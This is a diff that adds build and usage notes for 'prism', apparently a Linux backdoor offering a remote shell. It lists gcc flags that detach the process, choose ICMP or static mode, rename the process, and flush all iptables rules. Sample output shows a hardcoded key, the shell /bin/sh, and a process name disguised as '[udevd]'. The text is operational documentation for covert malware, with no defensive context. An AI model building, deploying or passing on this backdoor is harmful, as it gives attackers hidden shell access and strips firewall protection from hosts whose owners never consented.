@@ -1,0 +1,19 @@
+gcc <..OPTIONS..> -Wall -s -o prism prism.c
+
+Available GCC options:
+-DDETACH #Run the process in background
+-DSTATIC #Enable STATIC mode (default is the ICMP mode)
+-DNORENAME #Doesn't renames the process
+-DIPTABLES #Try to flush all iptables rules
+
+Example:
+gcc -DDETACH -DNORENAME -Wall -s -o prism prism.c
+
+$ ./prism Inf0
+ Version: 0.5
+ Mode: icmp
+ Key: p455w0rD
+ Process name: [udevd]
+ Shell: /bin/sh
+ Detach: Yes
+ Flush Iptables: No
